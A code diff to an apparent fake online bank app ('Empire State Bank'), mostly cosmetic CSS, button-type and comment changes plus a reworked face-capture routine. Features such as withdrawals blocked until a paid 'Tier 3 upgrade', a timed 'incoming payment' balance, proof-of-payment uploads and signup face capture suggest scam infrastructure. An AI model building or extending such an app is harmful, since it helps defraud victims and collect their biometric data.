@@ -1401,7 +1401,7 @@
     .camera-modal {
       position: fixed;
       inset: 0;
-      z-index: 10;
+      z-index: 1000;
       display: none;
       align-items: center;
       justify-content: center;
@@ -1436,6 +1436,7 @@
       margin-bottom: 15px;
       background: #000;
       max-height: 300px;
+      object-fit: cover;
     }
 
     .camera-canvas {
@@ -1455,6 +1456,7 @@
       font-weight: bold;
       cursor: pointer;
       transition: background 0.2s;
+      font-size: 14px;
     }
 
     .camera-capture {
@@ -1712,7 +1714,7 @@
         <div class="referral-section-title">Your Referral Code</div>
         <div class="referral-code">
           <span class="referral-code-text" id="referralCodeDisplay">@tag</span>
-          <button class="copy-btn" id="copyCodeBtn" title="Copy code">📋</button>
+          <button class="copy-btn" id="copyCodeBtn" type="button" title="Copy code">📋</button>
         </div>
       </div>
 
@@ -1721,8 +1723,8 @@
         <div class="referral-link">
           <span class="referral-link-text" id="referralLinkDisplay">https://empirestatebank.mssg.me</span>
           <div class="link-buttons">
-            <button class="link-btn" id="copyLinkBtn" title="Copy link">🔗</button>
-            <button class="link-btn share-btn" id="shareLinkBtn" title="Share">🔗</button>
+            <button class="link-btn" id="copyLinkBtn" type="button" title="Copy link">🔗</button>
+            <button class="link-btn share-btn" id="shareLinkBtn" type="button" title="Share">🔗</button>
           </div>
         </div>
       </div>
@@ -2025,9 +2027,9 @@
     <div class="tv-box">
       <div class="tv-title">Select TV Channel</div>
       <div class="tv-buttons">
-        <button class="tv-btn tv-channel-btn" id="channel1Btn">Channel 1</button>
-        <button class="tv-btn tv-channel-btn" id="channel2Btn">Channel 2</button>
-        <button class="tv-btn tv-close-btn" id="tvCloseBtn">Close</button>
+        <button class="tv-btn tv-channel-btn" id="channel1Btn" type="button">Channel 1</button>
+        <button class="tv-btn tv-channel-btn" id="channel2Btn" type="button">Channel 2</button>
+        <button class="tv-btn tv-close-btn" id="tvCloseBtn" type="button">Close</button>
       </div>
     </div>
   </div>
@@ -2038,7 +2040,6 @@
       <div class="camera-title">Capture Your Face</div>
       <video id="cameraVideo" class="camera-video" autoplay playsinline muted></video>
       <canvas id="cameraCanvas" class="camera-canvas"></canvas>
-      <img id="capturedImage" class="captured-image" />
       <div class="camera-buttons">
         <button class="camera-btn camera-capture" id="captureBtn" type="button">Capture Photo</button>
         <button class="camera-btn camera-close" id="cameraCloseBtn" type="button">Close</button>
@@ -2077,10 +2078,10 @@
 
         <div class="field">
           <label><span class="required">*</span>Face Capture</label>
-          <button type="button" id="openCameraBtn" class="primary-btn" style="background: var(--green);">📷 Capture Face</button>
-          <div id="facePreview" style="margin-top: 10px; display: none; text-align: center;">
-            <img id="facePreviewImg" style="width: 100%; border-radius: 8px; max-width: 200px;" />
-            <p style="font-size: 12px; color: var(--green); margin-top: 8px;">✓ Face captured successfully</p>
+          <button type="button" id="openCameraBtn" class="primary-btn" style="background: var(--green); margin-bottom: 10px;">📷 Capture Face</button>
+          <div id="facePreview" style="display: none; text-align: center;">
+            <img id="facePreviewImg" style="width: 100%; border-radius: 8px; max-width: 150px; margin-bottom: 10px;" />
+            <p style="font-size: 12px; color: var(--green);">✓ Face captured successfully</p>
           </div>
         </div>
 
@@ -2337,7 +2338,6 @@
       const now = Date.now();
 
       if (now >= end) {
-        // Payment has arrived
         $("incomingSection").style.display = "none";
         $("walletBalance1").textContent = "$" + currentUser.incomingPayment.toFixed(2);
       } else {
@@ -2348,7 +2348,7 @@
       }
     }
 
-    // Wallet Slider Touch/Drag
+    // Wallet Slider
     function setupWalletSlider() {
       const slider = $("walletSlider");
       const wrapper = $("walletSliderWrapper");
@@ -2424,7 +2424,7 @@
       }
     }
 
-    // Update Wallet Indicators
+    // Update Indicators
     function updateIndicators() {
       const indicators = document.querySelectorAll('.indicator');
       indicators.forEach((indicator, index) => {
@@ -2450,7 +2450,7 @@
       });
     });
 
-    // Customer Service Button
+    // Customer Service
     $("customerServiceBtn").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
@@ -2459,7 +2459,7 @@
       }, 1500);
     });
 
-    // Notification Button
+    // Notification
     $("notificationBtn").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
@@ -2468,7 +2468,7 @@
       }, 1500);
     });
 
-    // Fund eCash
+    // Fund
     $("fundBtn").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
@@ -2477,7 +2477,7 @@
       }, 1500);
     });
 
-    // Convert from E-wallet card
+    // Convert Card
     $("convertCardBtn").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
@@ -2499,7 +2499,7 @@
       }, 1500);
     });
 
-    // Withdraw from eCash card
+    // Withdraw Card
     $("withdrawCardBtn").addEventListener("click", () => {
       showPinModal(() => {
         const pinInput = $("pinInputField").value;
@@ -2547,19 +2547,19 @@
       });
     });
 
-    // PIN Modal Confirm Button
+    // PIN Confirm
     $("pinConfirmBtn").addEventListener("click", () => {
       if (pinModalCallback) {
         pinModalCallback();
       }
     });
 
-    // PIN Modal Cancel Button
+    // PIN Cancel
     $("pinCancelBtn").addEventListener("click", () => {
       closePinModal();
     });
 
-    // Convert Amount Input Handler
+    // Convert Amount
     $("convertAmountInput").addEventListener("input", (e) => {
       const usdAmount = parseFloat(e.target.value) || 0;
       const ngnAmount = usdAmount * EXCHANGE_RATE;
@@ -2568,7 +2568,7 @@
       $("convertBtnText").textContent = "Convert $" + usdAmount.toFixed(2);
     });
 
-    // Convert Button (from menu)
+    // Convert Menu
     $("convertMenuBtn").addEventListener("click", () => {
       const now = new Date();
 
@@ -2608,7 +2608,7 @@
       $("accountNumberDisplay").value = currentUser.accountNumber;
     }
 
-    // Convert Form Submission
+    // Convert Submit
     $("convertForm").addEventListener("submit", (e) => {
       e.preventDefault();
 
@@ -2626,24 +2626,24 @@
       }, 1500);
     });
 
-    // Close Convert Modal
+    // Convert Back
     $("convertModalBack").addEventListener("click", () => {
       closeModal("convertModal");
     });
 
-    // Investment Modal Setup
+    // Investment Modal
     function populateInvestmentModal() {
       $("investCardDisplay").textContent = `E-wallet Card (**${currentUser.cardNumber.slice(-4)})`;
       $("investFullName").value = currentUser.name;
       $("investDateInput").valueAsDate = new Date();
     }
 
-    // Close Investment Modal
+    // Investment Back
     $("investmentModalBack").addEventListener("click", () => {
       closeModal("investmentModal");
     });
 
-    // Investment Form Submission
+    // Investment Submit
     $("investmentForm").addEventListener("submit", (e) => {
       e.preventDefault();
 
@@ -2661,7 +2661,7 @@
       }, 1500);
     });
 
-    // Betting Button
+    // Betting
     $("bettingButton").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
@@ -2670,7 +2670,7 @@
       }, 1500);
     });
 
-    // TV Button
+    // TV
     $("tvButton").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
@@ -2699,12 +2699,12 @@
       }, 1500);
     });
 
-    // Close TV Modal
+    // Close TV
     $("tvCloseBtn").addEventListener("click", () => {
       closeModal("tvModal");
     });
 
-    // Referral Program Page
+    // Referral Page
     function showReferralPage() {
       $("dashboardPage").classList.add("hidden");
       $("referralPage").classList.add("active");
@@ -2715,13 +2715,13 @@
       $("referralLinkDisplay").textContent = "https://empirestatebank.mssg.me";
     }
 
-    // Close Referral Page
+    // Close Referral
     $("referralCloseBtn").addEventListener("click", () => {
       $("referralPage").classList.remove("active");
       $("dashboardPage").classList.remove("hidden");
     });
 
-    // Copy Referral Code
+    // Copy Code
     $("copyCodeBtn").addEventListener("click", () => {
       const code = $("referralCodeDisplay").textContent;
       navigator.clipboard.writeText(code).then(() => {
@@ -2729,7 +2729,7 @@
       });
     });
 
-    // Copy Referral Link
+    // Copy Link
     $("copyLinkBtn").addEventListener("click", () => {
       const link = $("referralLinkDisplay").textContent;
       navigator.clipboard.writeText(link).then(() => {
@@ -2737,7 +2737,7 @@
       });
     });
 
-    // Share Referral Link
+    // Share Link
     $("shareLinkBtn").addEventListener("click", () => {
       const link = $("referralLinkDisplay").textContent;
       const tag = $("referralCodeDisplay").textContent;
@@ -2754,7 +2754,7 @@
       }
     });
 
-    // Invitation Button
+    // Invitation
     $("invitationButton").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
@@ -2763,7 +2763,7 @@
       }, 1500);
     });
 
-    // Proof Page Functions
+    // Proof Page
     function showProofPage() {
       $("dashboardPage").classList.add("hidden");
       $("proofPage").classList.add("active");
@@ -2777,7 +2777,7 @@
       $("dashboardPage").classList.remove("hidden");
     });
 
-    // Profile Page Functions
+    // Profile Page
     function showProfile(user) {
       currentUser = user;
       $("dashboardPage").classList.add("hidden");
@@ -2817,7 +2817,7 @@
       }, 1500);
     });
 
-    // Proof Form File Upload
+    // Proof Upload
     $("uploadArea").addEventListener("click", () => {
       $("proofFileInput").click();
     });
@@ -2828,7 +2828,7 @@
       }
     });
 
-    // Proof Form Radio Buttons
+    // Proof Radio
     document.querySelectorAll('input[name="Account Status"]').forEach(radio => {
       radio.addEventListener("change", (e) => {
         if (e.target.value === "I don't have") {
@@ -2839,7 +2839,7 @@
       });
     });
 
-    // Get Account Button
+    // Get Account
     $("getAccountBtn").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
@@ -2857,7 +2857,7 @@
       }, 1500);
     });
 
-    // Proof Form Submission
+    // Proof Submit
     $("proofForm").addEventListener("submit", (e) => {
       e.preventDefault();
 
@@ -2873,7 +2873,7 @@
       }, 1500);
     });
 
-    // Invest button
+    // Invest
     $("investButton").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
@@ -2883,7 +2883,7 @@
       }, 1500);
     });
 
-    // Withdraw button
+    // Withdraw
     $("withdrawButton").addEventListener("click", () => {
       if (currentUser.tier === 2) {
         showAlert("Upgrade Required", "You need to upgrade your account to Tier 3 to withdraw. Please click Proceed to upgrade.", () => {
@@ -2903,15 +2903,20 @@
       }, 1500);
     });
 
-    // Camera Functions
+    // CAMERA FUNCTIONS
     async function startCamera() {
       try {
         mediaStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user' }
+          video: { facingMode: 'user', width: { ideal: 400 } }
         });
-        $("cameraVideo").srcObject = mediaStream;
-        openModal("cameraModal");
+        const video = $("cameraVideo");
+        video.srcObject = mediaStream;
+        video.onloadedmetadata = () => {
+          video.play();
+          openModal("cameraModal");
+        };
       } catch (error) {
+        console.error('Camera error:', error);
         showAlert("Camera Error", "Could not access camera. Please allow camera permissions and try again.");
       }
     }
@@ -2919,6 +2924,7 @@
     function stopCamera() {
       if (mediaStream) {
         mediaStream.getTracks().forEach(track => track.stop());
+        mediaStream = null;
       }
       closeModal("cameraModal");
     }
@@ -2928,31 +2934,31 @@
       startCamera();
     });
 
-    $("captureBtn").addEventListener("click", () => {
+    $("captureBtn").addEventListener("click", (e) => {
+      e.preventDefault();
       const video = $("cameraVideo");
       const canvas = $("cameraCanvas");
-      
-      if (!video.videoWidth || !video.videoHeight) {
-        showAlert("Error", "Camera not ready. Please try again.");
-        return;
-      }
-
       const context = canvas.getContext('2d');
+      
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       context.drawImage(video, 0, 0);
       
-      const imageData = canvas.toDataURL('image/png');
-      faceImageData = imageData;
-      $("faceData").value = imageData;
-      $("facePreviewImg").src = imageData;
-      $("facePreview").style.display = "block";
+      faceImageData = canvas.toDataURL('image/png');
+      $("faceData").value = faceImageData;
       
-      stopCamera();
-      showAlert("Success", "Face captured successfully!");
+      const img = new Image();
+      img.src = faceImageData;
+      img.onload = () => {
+        $("facePreviewImg").src = faceImageData;
+        $("facePreview").style.display = "block";
+        stopCamera();
+        showAlert("Success", "Face captured successfully!");
+      };
     });
 
-    $("cameraCloseBtn").addEventListener("click", () => {
+    $("cameraCloseBtn").addEventListener("click", (e) => {
+      e.preventDefault();
       stopCamera();
     });
 
@@ -2967,7 +2973,7 @@
       }
     });
 
-    // Make Payment Button
+    // Make Payment
     $("makePaymentBtn").addEventListener("click", (e) => {
       e.preventDefault();
       showLoading();
@@ -2977,7 +2983,7 @@
       }, 1500);
     });
 
-    // Sign-up Form Submission
+    // Signup Submit
     $("signupForm").addEventListener("submit", (e) => {
       e.preventDefault();
 
@@ -2999,7 +3005,7 @@
       }, 1500);
     });
 
-    // Login form
+    // Login Submit
     $("loginForm").addEventListener("submit", (event) => {
       event.preventDefault();
 
@@ -3022,7 +3028,7 @@
       }, 1500);
     });
 
-    // Signup link
+    // Signup Link
     $("signupLink").addEventListener("click", (event) => {
       event.preventDefault();
       faceImageData = null;
@@ -3037,7 +3043,7 @@
       }, 1000);
     });
 
-    // Profile shortcut
+    // Profile Shortcut
     $("profileShortcut").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
@@ -3050,7 +3056,7 @@
       }, 1500);
     });
 
-    // Me button
+    // Me Button
     $("meButton").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
